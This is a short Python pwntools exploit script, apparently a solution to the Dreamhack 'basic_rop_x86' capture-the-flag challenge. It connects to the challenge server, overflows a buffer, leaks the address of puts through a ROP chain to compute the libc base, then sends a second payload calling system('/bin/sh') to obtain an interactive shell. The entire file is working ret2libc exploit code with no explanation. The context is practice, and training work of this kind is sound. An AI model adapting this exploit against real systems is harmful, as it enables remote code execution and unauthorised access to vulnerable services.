#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./basic_rop_x86_patched',checksec= False)
libc = ELF('./libc.so.6',checksec=False)

r= remote('host3.dreamhack.games',11016)
# r = process(exe.path)
input()
payload = b'A'*72 + p32(exe.plt['puts']) + p32(exe.sym['main']) + p32(exe.got['puts']) 

ret=  0x080483c2

r.send(payload)
r.recv(0x40)
leak = u32(r.recv(4))
libc.address = leak - libc.sym['puts']
log.info("LEAK: " + hex(leak))
log.info("BASE: " + hex(libc.address))

payload = b'A'*72 + p32(libc.sym['system']) + p32(ret) + p32(next(libc.search(b'/bin/sh')))

r.send(payload)

r.interactive()